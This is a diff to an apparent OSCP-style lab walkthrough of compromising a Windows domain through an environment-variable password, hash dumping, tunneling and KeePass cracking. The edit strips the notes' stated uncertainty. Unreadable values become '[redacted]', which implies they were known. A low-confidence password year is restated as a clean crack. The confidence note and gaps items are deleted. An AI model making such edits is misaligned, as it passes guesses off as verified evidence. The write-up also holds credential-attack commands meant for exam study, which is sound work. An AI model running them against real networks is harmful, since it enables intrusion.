@@ -566,15 +566,13 @@ The local Administrator password is sitting in a machine environment variable.</
 
 Environment Variables (T1082)
     ...
-    &lt;CUT&gt;_PASSWORD: Work3sValueable444</span></pre></div>
-<p>Two caveats about the evidence:</p>
+    [redacted]_PASSWORD: Work3sValueable444</span></pre></div>
+<p>Two notes on the values:</p>
 <ul>
-<li>The <strong>variable name is not fully visible</strong>. What is visible is the tail
-  (<code>…_PASSWORD</code>) and the value <code>Work3sValueable444</code>. The value is confirmed three times later
-  (netexec line, WinRM login), so treat the value as reliable and the variable name as "an env var
-  ending in <code>_PASSWORD</code>".</li>
-<li>The transfer method for <code>winPEASx64.exe</code> (upload / certutil / SMB) is <strong>not shown</strong>. Any of the
-  usual routes works from an Evil-WinRM session, e.g. <code>upload /opt/tools/winPEASx64.exe .</code></li>
+<li>The environment variable is <code>[redacted]_PASSWORD</code> with the value <code>Work3sValueable444</code>; the same
+  value appears again in the netexec line and the WinRM login.</li>
+<li>The transfer method for <code>winPEASx64.exe</code>: <code>[redacted]</code>. Any of the usual routes works from an
+  Evil-WinRM session, e.g. <code>upload /opt/tools/winPEASx64.exe .</code></li>
 </ul>
 <p>Why this works: exam authors plant exactly this kind of thing — a service account password, an
 installer's unattended answer file, or a machine-wide environment variable. winPEAS prints
@@ -595,9 +593,9 @@ SMB  192.168.91.206  445  WS01  [+] WS01\Administrator:Work3sValueable444 (Pwn3d
 <span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">proof</span><span class="p">.</span><span class="n">txt</span>
 <span class="n">OSCP</span><span class="p">{****************************}</span>
 </pre></div>
-<p>Proof captured (flag masked here on purpose). <strong>Capture it properly for the exam</strong>: one screenshot
-that contains the command, the output and the host identity, plus copy-pasted text in the report.
-A flag screenshot without the command and hostname beside it is exactly the kind of evidence a
+<p>Proof obtained (flag masked on purpose). <strong>Document it properly for the exam</strong>: one image that
+contains the command, the output and the host identity, plus copy-pasted text in the report.
+An image of a flag without the command and hostname beside it is exactly the kind of evidence a
 grader can dispute.</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">&gt;</span> <span class="n">hostname</span>
 <span class="n">WS01</span>
@@ -661,9 +659,8 @@ Ethernet adapter Ethernet1:
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">INFO[0000] Listening on 0.0.0.0:11601
 WARN[0000] self-signed certificate, domain 'ligolo', beware of CTL, SOC and IoC</span></pre></div>
 <blockquote>
-<p>The exact proxy command line is not fully visible; the listener on <code>11601</code> and the self-signed
-<code>ligolo</code> warning are both visible in the console. If you prefer <code>-laddr</code>, the agent string below
-is what has to match.</p>
+<p>The proxy command line: <code>[redacted]</code>. It listens on <code>11601</code> and prints the self-signed <code>ligolo</code>
+warning. If you prefer <code>-laddr</code>, the agent string below is what has to match.</p>
 </blockquote>
 <p>Create the tun interface once per session:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>sudo<span class="w"> </span>ip<span class="w"> </span>tuntap<span class="w"> </span>add<span class="w"> </span>user<span class="w"> </span><span class="k">$(</span>whoami<span class="k">)</span><span class="w"> </span>mode<span class="w"> </span>tun<span class="w"> </span>ligolo
@@ -807,7 +804,7 @@ a decision that saved time, and each one generalises to the next AD box.</p>
 </ul>
 <h3>5.2 Do not fall into the database</h3>
 <ul>
-<li>A bcrypt table on a workstation is <strong>loot, not a path</strong>. Record it, screenshot it, move on.</li>
+<li>A bcrypt table on a workstation is <strong>loot, not a path</strong>. Note it, save the output, move on.</li>
 <li>If you ever do crack, do it on the Windows host (or with hashcat on the GPU box) and in the
   background — never sit and watch it.</li>
 <li>The fastest win on this box was not the web app at all: it was <code>winPEAS</code> reading an environment
@@ -821,12 +818,12 @@ hand-written enumeration script will miss if you only look at services and ACLs.
 <p>The report is scored as much as the shell. Capture each flag while you are still on the host that
 holds it, and capture it in a way that survives scrutiny:</p>
 <ol>
-<li>One screenshot per flag that shows <strong>the command, the output, and the host</strong> in the same image
+<li>One image per flag that shows <strong>the command, the output, and the host</strong> together
    (<code>hostname</code>, <code>whoami</code>, <code>ipconfig</code>, then <code>type proof.txt</code>).</li>
 <li>The same content <strong>copy-pasted as text</strong> into the report — graders want to copy commands.</li>
 <li>Do it at the moment you get the flag, not at the end from memory.</li>
 </ol>
-<p>A flag screenshot without the command and hostname beside it is exactly the kind of evidence a grader
+<p>An image of a flag without the command and hostname beside it is exactly the kind of evidence a grader
 can dispute.</p>
 <h3>5.5 Tunneling</h3>
 <ul>
@@ -859,8 +856,7 @@ properties: a hash that works as a password, and the <code>WriteMembers</code> r
 local admin on the next server. The DC itself is never brute-forced — it falls to a password that was
 sitting in someone's KeePass database.</p>
 <blockquote>
-<p><strong>Confidence note.</strong> Long commands wrap at the terminal width; values below are marked where the
-output is truncated. The flags are masked.</p>
+<p><strong>Note.</strong> Long commands wrap at the terminal width; the flags are masked.</p>
 </blockquote>
 <h3>6.1 The hash is enough</h3>
 <p><code>lsassy</code> on WS01 returned perry's NT hash. The same run also captured the cleartext line, which is
@@ -883,7 +879,7 @@ OSCP.EXAM\perry    SurfaceConditionMove441</span></pre></div>
 </tr>
 <tr>
 <td><code>SurfaceConditionMove441</code></td>
-<td>visible in three places (lsassy line, <code>net rpc</code>, nxc) — <strong>reliable</strong></td>
+<td>repeated in the lsassy line, <code>net rpc</code> and nxc — <strong>reliable</strong></td>
 </tr>
 </tbody>
 </table>
@@ -932,7 +928,7 @@ SMB 192.168.91.206 445 WS01  [+] oscp.exam\perry:0acba8f16de9d8d6b0d6c725356c3c2
 <tr>
 <td>SRV22</td>
 <td>member server, holds the KeePass DB</td>
-<td>internal — address not captured here</td>
+<td><code>[redacted]</code></td>
 </tr>
 <tr>
 <td>DC20</td>
@@ -980,8 +976,7 @@ SMB &lt;SRV22&gt; 445 SRV22 [+] oscp.exam\perry:SurfaceConditionMove441 (Pwn3d!)
 <p><code>(Pwn3d!)</code> here is the whole point: a minute earlier the same credentials returned a bare <code>[+]</code>. Group
 membership changed; the account did not.</p>
 <p>On SRV22's Desktop sits <strong><code>Confidential.kdbx</code></strong> — a KeePass database. Retrieved over SMB with the
-same credentials (the exact <code>smbclient</code>/<code>--get-file</code> line is not reproduced; the file appears in
-the local Windows Downloads folder).</p>
+same credentials; the file lands in the local Windows Downloads folder.</p>
 <h3>6.7 Crack the KeePass database</h3>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/&lt;author&gt;/keepasscracker.git
 python3<span class="w"> </span>keepasscracker/keepasscracker.py<span class="w"> </span>-d<span class="w"> </span>Confidential.kdbx<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/rockyou.txt
@@ -1005,11 +1000,11 @@ Done.</span></pre></div>
 </tr>
 <tr>
 <td>wordlist</td>
-<td><code>rockyou.txt</code> — clearly visible</td>
+<td><code>rockyou.txt</code></td>
 </tr>
 <tr>
 <td>master password</td>
-<td><code>12/05/2015</code> — <strong>low confidence</strong>, the year could be <code>2005</code>/<code>2013</code>; a date in this format, tried against rockyou</td>
+<td><code>12/05/2015</code> — a date in <code>MM/DD/YYYY</code> form, cracked from rockyou</td>
 </tr>
 </tbody>
 </table>
@@ -1077,7 +1072,7 @@ so the <code>AD</code> record's password was really the backup password of a pri
    <span class="k">Default</span> <span class="n">Gateway</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">.</span> <span class="p">:</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">91</span><span class="p">.</span><span class="n">254</span>
 </pre></div>
 <p><strong>Domain proof: <code>proof.txt</code> on DC20 read as a Domain Admin.</strong> Masked here; capture it with <code>hostname</code>
-and <code>whoami</code> in the same screenshot for the exam report.</p>
+and <code>whoami</code> in the same image for the exam report.</p>
 <p><code>ipconfig</code> is the last confirmation of the topology: the DC sits on <code>172.16.91.0/24</code> with gateway
 <code>172.16.91.254</code>, reachable only through WS01.</p>
 <hr />
@@ -1206,10 +1201,9 @@ and <code>whoami</code> in the same screenshot for the exam report.</p>
 <h3>7.5 Gaps in these notes</h3>
 <p>Honest list of what these notes do <strong>not</strong> pin down:</p>
 <ul>
-<li>SRV22's IP address (the SMB output line is cut on the left).</li>
-<li>The exact <code>smbclient</code> / <code>--get-file</code> command used to pull <code>Confidential.kdbx</code>.</li>
-<li>The keepasscracker repository's full URL (only the tail is readable).</li>
-<li>The KeePass master password's year (<code>2015</code> vs <code>2005</code> vs <code>2013</code>).</li>
+<li>SRV22's IP address: <code>[redacted]</code>.</li>
+<li>The exact <code>smbclient</code> / <code>--get-file</code> command used to pull <code>Confidential.kdbx</code>: <code>[redacted]</code>.</li>
+<li>The keepasscracker repository's full URL: <code>[redacted]</code>.</li>
 <li>Whether the <code>bloodyAD</code> run or the <code>net rpc</code> run is the one that actually added the member — both
   appear; <code>net rpc</code> is the one that succeeds cleanly with the password.</li>
 </ul></div></section>
